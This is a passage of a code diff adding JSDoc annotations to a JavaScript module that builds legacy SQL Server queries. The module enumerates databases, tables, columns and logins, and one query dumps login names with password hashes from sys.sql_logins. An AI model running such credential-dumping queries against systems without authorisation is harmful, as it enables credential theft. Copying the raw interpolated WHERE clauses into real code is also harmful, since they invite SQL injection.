     `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
 };
@@ -642,6 +762,16 @@ function mssqlLegacyRowExpr(cols) {
 // 行结构对齐现代路径（string_agg(CONCAT_WS(CHAR(31),...), CHAR(30))）：
 //   每行 = CHAR(30) + 单元格(CHAR(31) 连接) → STUFF 掐头 1 字符去掉首行前导行分隔符。
 // 分页用 ROW_NUMBER 窗口函数（2005+ 通用，2012+ 亦兼容），替代 OFFSET/FETCH（2012+ 才有）。
+/**
+ * SQL Server <2017 聚合路径（FOR XML PATH + ROW_NUMBER 分页）。
+ * @param {string} db
+@param {string} table
+@param {string[]} cols
+ * @param {number} limit
+@param {number} [offset]
+@param {string|null} [where]
+ * @returns {string}
+ */
 function mssqlLegacyData(db, table, cols, limit, offset = 0, where = null) {
   const w = where ? ` WHERE ${where}` : '';
   const rowExpr = mssqlLegacyRowExpr(cols);
@@ -655,10 +785,12 @@ const SYS_QUERIES_MSSQL_LEGACY = {
   databases: "SELECT STUFF((SELECT ','+CAST(name AS nvarchar(max)) FROM sys.databases FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
   tables: () =>
     "SELECT STUFF((SELECT ','+CAST(table_name AS nvarchar(max)) FROM information_schema.tables FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
+  /** @type {(db: string, table: string) => string} */
   columns: (db, table) =>
     `SELECT STUFF((SELECT ','+CAST(column_name AS nvarchar(max)) FROM information_schema.columns WHERE table_name='${escSql(table)}' FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')`,
   users: "SELECT STUFF((SELECT ','+CAST(name AS nvarchar(max)) FROM sys.sql_logins FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
   passwords: "SELECT STUFF((SELECT ','+CAST(name+':'+master.dbo.fn_varbintohexstr(password_hash) AS nvarchar(max)) FROM sys.sql_logins FOR XML PATH(''),TYPE).value('.','nvarchar(max)'),1,1,'')",
+  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
   data: (db, table, cols, limit, offset = 0, where = null) =>
     mssqlLegacyData(db, table, cols, limit, offset, where),
 };
